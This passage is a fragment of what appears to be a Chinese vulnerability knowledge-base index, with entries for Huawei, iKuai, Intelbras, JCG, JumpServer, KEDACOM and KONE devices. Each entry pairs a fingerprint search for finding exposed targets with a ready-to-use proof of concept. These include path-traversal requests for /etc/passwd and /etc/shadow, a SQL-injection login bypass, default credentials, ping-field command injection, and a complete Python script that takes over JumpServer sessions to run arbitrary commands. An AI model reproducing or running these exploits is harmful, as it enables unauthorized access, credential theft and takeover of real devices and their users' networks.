","date":"0001-01-01","objectID":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/hikvision-%E8%A7%86%E9%A2%91%E7%BC%96%E7%A0%81%E8%AE%BE%E5%A4%87%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-showfile.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Huawei DG8045 deviceinfo 信息泄漏漏洞 ","date":"0001-01-01","objectID":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Huawei DG8045 deviceinfo api接口存在信息泄漏漏洞，攻击者通过泄漏的信息可以获得账号密码登录后台 ","date":"0001-01-01","objectID":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Huawei DG8045 ","date":"0001-01-01","objectID":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"DG8045-Home-Gateway-DG8045\" ","date":"0001-01-01","objectID":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /api/system/deviceinfo SerialNumber 后8位即为初始密码 ","date":"0001-01-01","objectID":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/huawei-dg8045-deviceinfo-%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Huawei HG659 lib 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件 ","date":"0001-01-01","objectID":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Huawei HG659 ","date":"0001-01-01","objectID":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"HUAWEI-Home-Gateway-HG659\" ","date":"0001-01-01","objectID":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 POC如下 /lib///....//....//....//....//....//....//....//....//etc//passwd ","date":"0001-01-01","objectID":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/huawei-hg659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"iKuai 后台任意文件读取漏洞 ","date":"0001-01-01","objectID":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 参考链接： https://forum.ywhack.com/thread-115307-1-8.html ","date":"0001-01-01","objectID":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 影响版本，不一定是绝对版本，也可能其它版本都存在： 3.2.8 x64 Build201910101758 ","date":"0001-01-01","objectID":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"登录爱快流控路由\" ","date":"0001-01-01","objectID":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 默认用户名/密码：admin/admin poc： GET /Action/download?filename=../../../../../../etc/shadow HTTP/1.1 Host： .... ","date":"0001-01-01","objectID":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/ikuai-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"iKuai 流控路由 SQL注入漏洞 ","date":"0001-01-01","objectID":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 iKuai 流控路由 存在SQL注入漏洞，可以通过SQL注入漏洞构造万能密码获取路由器后台管理权限 ","date":"0001-01-01","objectID":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 iKuai 流控路由 ","date":"0001-01-01","objectID":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"登录爱快流控路由\" ","date":"0001-01-01","objectID":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 使用万能密码登录后台 user: \"or\"\"=\"\"or\"\"=\" pass: 空 ","date":"0001-01-01","objectID":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/ikuai-%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Intelbras Wireless 未授权与密码泄露 CVE-2021-3017 ","date":"0001-01-01","objectID":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/:0:0","tags":null,"title":"","uri":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/"},{"categories":null,"content":"漏洞描述 Intelbras IWR 3000N是波兰Intelbras公司的一款无线路由器。 Intelbras WIN 300 and WRN 342 devices 2021-01-04版本及之前版本存在安全漏洞，该漏洞允许远程攻击者通过读取HTML源代码中的def wireless spassword行来发现凭据。 ","date":"0001-01-01","objectID":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/:1:0","tags":null,"title":"","uri":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/"},{"categories":null,"content":"漏洞影响 win_300_firmware 等 ","date":"0001-01-01","objectID":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/:2:0","tags":null,"title":"","uri":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/"},{"categories":null,"content":"网络测绘 body=\"def_wirelesspassword\" ","date":"0001-01-01","objectID":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/:3:0","tags":null,"title":"","uri":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/"},{"categories":null,"content":"漏洞复现 登录页面如下 查看网页源代码，泄露了配置密码 测试了一下其他的，发现出现账号密码的原因为访问的是路由的配置页面，配置后获取后台权限 ","date":"0001-01-01","objectID":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/:4:0","tags":null,"title":"","uri":"/intelbras-wireless-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%B8%8E%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2-cve-2021-3017/"},{"categories":null,"content":"JCG JHR-N835R 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 JCG JHR-N835R 后台存在命令执行，通过 ; 分割 ping 命令导致任意命令执行 ","date":"0001-01-01","objectID":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 JCG JHR-N835R ","date":"0001-01-01","objectID":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Shodan JHR-N835R ","date":"0001-01-01","objectID":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 admin admin登录 在后台系统工具那使用 PING工具，使用 ; 命令执行绕过 ","date":"0001-01-01","objectID":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/jcg-jhr-n835r-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"JumpServer 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 JumpServer 是全球首款完全开源的堡垒机, 使用GNU GPL v2.0 开源协议, 是符合4A 的专业运维审计系统。 JumpServer 使用Python / Django 进行开发。2021年1月15日，阿里云应急响应中心监控到开源堡垒机JumpServer发布更新，修复了一处远程命令执行漏洞。由于 JumpServer 某些接口未做授权限制，攻击者可构造恶意请求获取敏感信息，或者执行相关操作控制其中所有机器，执行任意命令。 ","date":"0001-01-01","objectID":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 JumpServer \u003c v2.6.2 JumpServer \u003c v2.5.4 JumpServer \u003c v2.4.5 JumpServer = v1.5.9 ","date":"0001-01-01","objectID":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 详情参考：https://www.o2oxy.cn/2921.html poc.py： # -*- coding: utf-8 -*- # import requests # import json # data={\"user\":\"4320ce47-e0e0-4b86-adb1-675ca611ea0c\",\"asset\":\"ccb9c6d7-6221-445e-9fcc-b30c95162825\",\"system_user\":\"79655e4e-1741-46af-a793-fff394540a52\"} # # url_host='http://192.168.1.73:8080' # # def get_token(): # url = url_host+'/api/v1/users/connection-token/?user-only=1' # url =url_host+'/api/v1/authentication/connection-token/?user-only=1' # response = requests.post(url, json=data).json() # print(response) # ret=requests.get(url_host+'/api/v1/authentication/connection-token/?token=%s'%response['token']) # print(ret.text) # get_token() import asyncio import websockets import requests import json url = \"/api/v1/authentication/connection-token/?user-only=None\" # 向服务器端发送认证后的消息 async def send_msg(websocket,_text): if _text == \"exit\": print(f'you have enter \"exit\", goodbye') await websocket.close(reason=\"user exit\") return False await websocket.send(_text) recv_text = await websocket.recv() print(f\"{recv_text}\") # 客户端主逻辑 async def main_logic(cmd): print(\"#######start ws\") async with websockets.connect(target) as websocket: recv_text = await websocket.recv() print(f\"{recv_text}\") resws=json.loads(recv_text) id = resws['id'] print(\"get ws id:\"+id) print(\"###############\") print(\"init ws\") print(\"###############\") inittext = json.dumps({\"id\": id, \"type\": \"TERMINAL_INIT\", \"data\": \"{\\\"cols\\\":164,\\\"rows\\\":17}\"}) await send_msg(websocket,inittext) for i in range(20): recv_text = await websocket.recv() print(f\"{recv_text}\") print(\"###############\") print(\"exec cmd: ls\") cmdtext = json.dumps({\"id\": id, \"type\": \"TERMINAL_DATA\", \"data\": cmd+\"\\r\\n\"}) print(cmdtext) await send_msg(websocket, cmdtext) for i in range(20): recv_text = await websocket.recv() print(f\"{recv_text}\") print('#######finish') if __name__ == '__main__': try: import sys host=sys.argv[1] cmd=sys.argv[2] if host[-1]=='/': host=host[:-1] print(host) data = {\"user\": \"4320ce47-e0e0-4b86-adb1-675ca611ea0c\", \"asset\": \"ccb9c6d7-6221-445e-9fcc-b30c95162825\", \"system_user\": \"79655e4e-1741-46af-a793-fff394540a52\"} print(\"##################\") print(\"get token url:%s\" % (host + url,)) print(\"##################\") res = requests.post(host + url, json=data) token = res.json()[\"token\"] print(\"token:%s\", (token,)) print(\"##################\") target = \"ws://\" + host.replace(\"http://\", '') + \"/koko/ws/token/?target_id=\" + token print(\"target ws:%s\" % (target,)) asyncio.get_event_loop().run_until_complete(main_logic(cmd)) except: print(\"python jumpserver.py http://192.168.1.73 whoami\") ","date":"0001-01-01","objectID":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jumpserver-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"KEDACOM数字系统接入网关 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 KEDACOM 数字系统接入网关 存在任意文件读取漏洞，攻击者通过构造请求可以读取服务器任意文件 ","date":"0001-01-01","objectID":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 KEDACOM 数字系统接入网关 ","date":"0001-01-01","objectID":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 (app=\"KEDACOM-DVR接入网关\") \u0026\u0026 (is_honeypot=false \u0026\u0026 is_fraud=false) ","date":"0001-01-01","objectID":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 使用POC读取 /etc/hosts /gatewayweb/FileDownloadServlet?fileName=test.txt\u0026filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg\u0026type=2 ","date":"0001-01-01","objectID":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kedacom%E6%95%B0%E5%AD%97%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%85%A5%E7%BD%91%E5%85%B3-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"KONE 通力电梯管理系统 app_show_log_lines.php 任意文件读取漏洞 ","date":"0001-01-01","objectID":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 KONE 通力电梯 app_show_log_lines.php文件过滤不足导致任意文件读取漏洞 ","date":"0001-01-01","objectID":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 KONE 通力电梯管理系统 ","date":"0001-01-01","objectID":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"KONE Configuration management\" ","date":"0001-01-01","objectID":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 主页面 发送POST请求包 fileselection=/etc/passwd ","date":"0001-01-01","objectID":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/kone-%E9%80%9A%E5%8A%9B%E7%94%B5%E6%A2%AF%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-app_show_log_lines.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Kyan 网络监控设备 hosts 账号密码泄露漏洞 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Kyan 网络监控设备 存在账号密码泄露漏洞，攻击者通过漏洞可以获得账号密码和后台权限 ","date":"0001-01-01","objectID":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/kyan-%E7%BD%91%E7%BB%9C%E7%9B%91%E6%8E%A7%E8%AE%BE%E5%A4%87-hosts-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Kyan 